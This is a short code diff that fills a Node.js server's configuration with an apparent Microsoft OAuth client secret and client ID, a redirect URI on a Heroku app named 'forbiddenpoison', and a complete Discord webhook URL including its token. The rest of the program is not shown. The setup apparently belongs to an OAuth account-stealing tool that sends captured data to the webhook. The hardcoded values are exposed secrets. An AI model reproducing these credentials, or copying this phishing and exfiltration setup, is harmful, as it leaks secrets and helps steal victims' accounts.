@@ -1,8 +1,8 @@
 // Configuration
-const client_secret = ''
-const client_id = ''
-const redirect_uri = ''
-const webhook_url = ''
+const client_secret = 'nYd8Q~SydjEjhSwba4FcSgfi6sqWwZDIhYko5dA3'
+const client_id = '88f11162-96f1-49fe-acd3-f5a922a66357'
+const redirect_uri = 'https://forbiddenpoison.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1041742963677597726/AQ_h8X9-ZyGMLeb98mfPEtGCcnBmW3dn9U9RS6Upo5841fMKsNCyElbQOQ3-Dgef4m11'
 // Config end
 const axios = require('axios')
 const express = require('express')
